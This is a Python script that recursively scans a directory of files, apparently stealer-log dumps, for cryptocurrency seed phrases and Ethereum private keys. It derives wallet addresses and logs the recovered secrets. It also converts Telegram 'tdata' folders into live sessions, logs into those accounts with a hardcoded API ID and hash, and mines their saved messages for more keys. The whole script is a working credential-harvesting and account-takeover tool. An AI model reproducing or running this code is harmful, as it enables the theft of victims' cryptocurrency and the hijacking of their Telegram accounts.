#!/usr/bin/env python3

import datetime
import os, os.path as op
import sqlite3
import re
import sys
import argparse
import multiprocessing as mp
from mnemonic import Mnemonic
from convert_tdata import convert_tdata
from telethon.sync import TelegramClient
from telethon.errors import InvalidBufferError
from telethon.sessions import StringSession

from gen_wallet import *

PARCE_ETH=False
LOG_DIR='./logs/'
BASE_DIR = op.abspath(op.dirname(__file__))
SOURCE_DIR = '/home/pr1sm/Downloads/TEST/'#op.join(BASE_DIR, '/home/user/FILES/')


BAD_EXTENSIONS = {
    '.jpg',
    '.png',
    '.jpeg',
    '.ico',
    '.gif',
    '.iso',
    '.dll',
    '.sys',
    '.zip',
    '.rar',
    '.7z',
    '.cab',
    '.dat'
}
BAD_DIRS=[
    'ololololz'
]
BAD_FILES=[
    'ololololo'
]

ENABLE_LANG=[
    'english',
    'chinese_simplified',
    'chinese_traditional',
    'french',
    'italian',
    'japanese',
    'korean',
    'portuguese',
    'spanish'
]
WORDS_CHAIN_SIZES = {12, 15, 18, 24}
EXWORDS=2

CREATE_TABLES_SQL = """
DROP TABLE [temp];
CREATE TABLE [temp](
  [phrase] VARCHAR(500),
  PRIMARY KEY([phrase]));
"""


class DBController:
    def __init__(self,in_memory=True):
        #self.conn=sqlite3.connect("file::memory:?cache=shared", uri=True,detect_types=sqlite3.PARSE_DECLTYPES)
        self.conn=sqlite3.connect('tmp.db',detect_types=sqlite3.PARSE_DECLTYPES)

    def insert_phrase(self,phrase):
        cur=self.conn.cursor()
        try:
            cur.execute('insert into temp values (?)',(phrase,))
            self.conn.commit()
        except:
            self.conn.rollback()
            raise

    def pharse_in_db(self,phrase):
        cur=self.conn.cursor()
        r=cur.execute('select Count(*) from temp where phrase=?',(phrase,)).fetchone()
        return r[0]>0

    def __del__(self):
        self.conn.close()

    def creat_tables(self):
        cur=self.conn.cursor()
        try:
            sqls=CREATE_TABLES_SQL.split(';')
            for s in sqls:
                try:
                    cur.execute(s)
                    self.conn.commit()
                except:
                    self.conn.rollback()

        except:
            self.conn.rollback()
            raise

def valid_prase(words):
    if EXWORDS==0:
        return True
    cnt=[words.count(w) for w in words]
    return max(cnt)<=EXWORDS

def write_log(log_name,data):
    with open(LOG_DIR+log_name,'a',encoding='utf-8') as f:
        f.write(str(data)+'\n')

def get_prase_arr(raw):
    raw_len=len(raw)
    if raw_len in WORDS_CHAIN_SIZES:
        return [raw]
    elif raw_len<min(WORDS_CHAIN_SIZES):
        return []
    else:
        len_list=[]
        prase_arr=[]
        for m in WORDS_CHAIN_SIZES:
            if m<raw_len:
                len_list.append(m)
        for m in len_list:
            i = 0
            while i<raw_len:
                tail=i+m
                p=raw[i:tail]
                if len(p)<m:
                    break
                prase_arr.append(p)
                i+=1
        return prase_arr

def find_in_file(path,log_lock,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG):
    data = open(path, 'rb').read()

    for enc in ('UTF-8', 'CP437'):
        try:
            data = data.decode(enc)
            break
        except UnicodeDecodeError as e:
            pass
    else:
        return
    _find_in_data(path,data,log_lock,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG)

def _find_in_data(path,data,log_lock,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG,parce_tg=False):
    words_chain = []
    lang=''
    db=DBController()
    for m in re.finditer('[a-z]+', data, re.I):
        word = m.group(0).lower()
        to_continue=False
        if len(words_chain)==0:
            for k in words_arr:
                words=words_arr[k]['words']
                mnemo=words_arr[k]['mnemo']
                if word in words:
                    words_chain.append(word)
                    to_continue=True
                    lang=k
                    break
            if to_continue:
                continue


        else:
            if word in words:
                words_chain.append(word)
                continue

        prase_list=get_prase_arr(words_chain)
        for prase in prase_list:
        #if len(words_chain) in WORDS_CHAIN_SIZES:
            words_str = ' '.join(prase)
            if valid_prase(prase):
                if mnemo.check(words_str) and not db.pharse_in_db(words_str):
                    s='%s\n%s\n' %(path, words_str)

                    full_log,coin_log=print_wallets_bip(words_str)
                    db.insert_phrase(words_str)
                    print(s+full_log)
                    if SEED_LOG is not None:
                        log_lock.acquire()
                        try:
                            write_log(f'{lang}_{SEED_LOG}',words_str)
                            write_log(f'{SEED_LOG}',words_str)
                            write_log(FULL_LOG,s+full_log)
                            for coin in coin_log:
                                write_log(coin+ADDR_log,'\n'.join(coin_log[coin]))
                        finally:
                            log_lock.release()
        words_chain = []

    prase_list=get_prase_arr(words_chain)
    for prase in prase_list:
    #if len(words_chain) in WORDS_CHAIN_SIZES:
        words_str = ' '.join(prase)
        if valid_prase(prase):
            if mnemo.check(words_str) and not db.pharse_in_db(words_str):
                s = '%s\n%s\n' % (path, words_str)
                full_log, coin_log = print_wallets_bip(words_str)
                db.insert_phrase(words_str)
                print(s + full_log)
                if SEED_LOG is not None:
                    log_lock.acquire()
                    try:
                        write_log(f'{lang}_{SEED_LOG}', words_str)
                        write_log(f'{SEED_LOG}', words_str)
                        write_log(FULL_LOG, s + full_log)
                        for coin in coin_log:
                            write_log(coin + ADDR_log, '\n'.join(coin_log[coin]))
                    finally:
                        log_lock.release()

    if PARCE_ETH and not parce_tg:
        for m in re.finditer(r"(?:[^\w/\\]|^)([a-f0-9]{64})(?:\W|$)", data, re.I):
            short_path=path.replace('\\\\?\\','')
            private_key=m[1]
            address=get_eth_addr(private_key)
            s=f'{short_path}\n' \
              f'ETH-Privkey:{private_key}\n' \
              f'ETH-Address:{address}\n' \
              f'{"-"*24}\n'

            #print(s)
            if ETH_FULL_LOG is not None:
                log_lock.acquire()
                try:
                    write_log(ETH_FULL_LOG, s)
                    write_log(ETH_A_LOG, address)
                    write_log(ETH_P_LOG, f'{address}:{private_key}')
                finally:
                    log_lock.release()
    elif parce_tg:
        for m in re.finditer(r"(?:[^\w/\\]|^)([a-f0-9]{64})(?:\W|$)", data, re.I):
            #short_path=path.replace('\\\\?\\','')
            private_key=m[1]
            address=get_eth_addr(private_key)
            #s=f'{short_path}\n' \
            #  f'ETH-Privkey:{private_key}\n' \
            #  f'ETH-Address:{address}\n' \
            #  f'{"-"*24}\n'

            #print(s)
            write_log(ETH_A_LOG, f'{address}:{private_key}')
            write_log(ETH_P_LOG, private_key)



API_ID = 17463049
API_HASH = "bd4bbac77f54cd096ede52dd2e8e2e50"

def check_sess(tdata,sess,log_lock,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG):
    try:
        client = TelegramClient(StringSession(sess), API_ID, API_HASH)
        client.connect()
        me = client.get_me()

        for m in client.iter_messages('me'):
            if not isinstance(m.message, str):
                continue
            _find_in_data(tdata,m.message,log_lock,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG,parce_tg=True)

    except:
        print(sys.exc_info())

def thread_fun(dir,log_lock,parce_tg,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG):
    """global words, mnemo

    words = set([w.strip() for w in open(op.join(BASE_DIR, 'wordlist', 'english.txt'))])
    mnemo = Mnemonic("english")"""
    global words_arr
    words_arr={}
    if 'english' in ENABLE_LANG:
        words_arr['english'] = {'words':set([w.strip() for w in open(op.join(BASE_DIR, 'wordlist', 'english.txt'))]),
                                'mnemo': Mnemonic("english")}


    for f in os.listdir(op.join(BASE_DIR, 'wordlist', 'Other')):
        lang=f.split('.')[0]
        if lang in ENABLE_LANG:
            words_arr[lang] = {'words': set([w.strip() for w in open(op.join(BASE_DIR, 'wordlist/Other', f),encoding='utf8')]),
                                    'mnemo': Mnemonic(f"Other/{lang}")}



    for item in os.walk(dir):
        if (os.path.split(item[0])[1]=='tdata') and parce_tg:
            tdata = item[0]
            try:
                for s in convert_tdata(tdata):
                    check_sess(tdata,s,log_lock,'tg_seeds.txt',ADDR_log,FULL_LOG,ETH_FULL_LOG,'tg_addr.txt','tg_eth_pk.txt')
            except:
                print(sys.exc_info())
        else:
            if len(item[2]) == 0:
                continue

            is_bad_dir=False
            for bad_dir in [bd.lower() for bd in BAD_DIRS]:
                if item[0].lower().find(bad_dir)>=0:
                    is_bad_dir=True
                    break
            if is_bad_dir:
                continue

            for f in item[2]:
                f_name,f_ext=op.splitext(f)
                if f_ext in BAD_EXTENSIONS:
                    continue

                is_bad_file=False
                for bad_file in [bf.lower() for bf in BAD_FILES]:
                    if f_name.lower().find(bad_file)>=0:
                        is_bad_file=True
                        break

                if is_bad_file:
                    continue
                try:
                    prefix=''
                    if sys.platform=='win32':
                        prefix='//?/'
                    fd=prefix+op.join(item[0], f)
                    fd=op.normpath(fd)
                    find_in_file(fd,log_lock,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG)
                except:
                    print('ERROR on parce file:',sys.exc_info())
                    pass
    return dir

def main():
    #global words, result, mnemo

    manager = mp.Manager()
    log_lock=manager.RLock()
    parser = argparse.ArgumentParser()
    parser.add_argument('-w',action='store_true', default=True)
    parser.add_argument('-t', default=4, type=int)
    parser.add_argument('-g',action='store_true', default=False)
    args = parser.parse_args()

    THREADS_COUNT=args.t
    is_write_log=args.w

    parce_tg=args.g
    if is_write_log:
        n=datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')
        SEED_LOG=f'seed-{n}.txt'
        ADDR_log=f'-addreses-{n}.txt'
        FULL_LOG=f'full-log-{n}.txt'
        ETH_FULL_LOG=f'eth-full-log-{n}.txt'
        ETH_A_LOG=f'eth-a-log-{n}.txt'
        ETH_P_LOG=f'eth-p-log-{n}.txt'
    else:
        SEED_LOG=None
        ADDR_log=None
        FULL_LOG=None
        ETH_FULL_LOG=None
        ETH_A_LOG=None
        ETH_P_LOG=None

    """if len(sys.argv) == 2:
        if not op.isdir(sys.argv[1]):
            print(
                "'%s' is not a directory.\n\nUsage: %s [target-dir]" % (
                    sys.argv[1],
                    op.basename(__file__)
                )
            )
            exit(os.EX_SOFTWARE)

        result = open(op.join(sys.argv[1], datetime.datetime.now().isoformat() + '.txt'), 'w')
    else:
        result = sys.stdout"""


    db=DBController()
    db.creat_tables()
    work_pool = mp.Pool(THREADS_COUNT)
    params=[(op.join(SOURCE_DIR,d),log_lock,parce_tg,SEED_LOG,ADDR_log,FULL_LOG,ETH_FULL_LOG,ETH_A_LOG,ETH_P_LOG) for d in os.listdir(SOURCE_DIR)]
    #thread_fun(*params[0])
    res=work_pool.starmap(thread_fun,params)
    print('DONE.',len(res))
    print('\n'.join([str(r) for r in res]))

    """words = set([w.strip() for w in open(op.join(BASE_DIR, 'wordlist', 'english.txt'))])
    mnemo = Mnemonic("english")

    for item in os.walk(SOURCE_DIR):
        if len(item[2]) == 0:
            continue

        for f in item[2]:
            if op.splitext(f)[1] in BAD_EXTENSIONS:
                continue

            find_in_file(op.join(item[0], f))"""


if __name__ == '__main__':
    main()
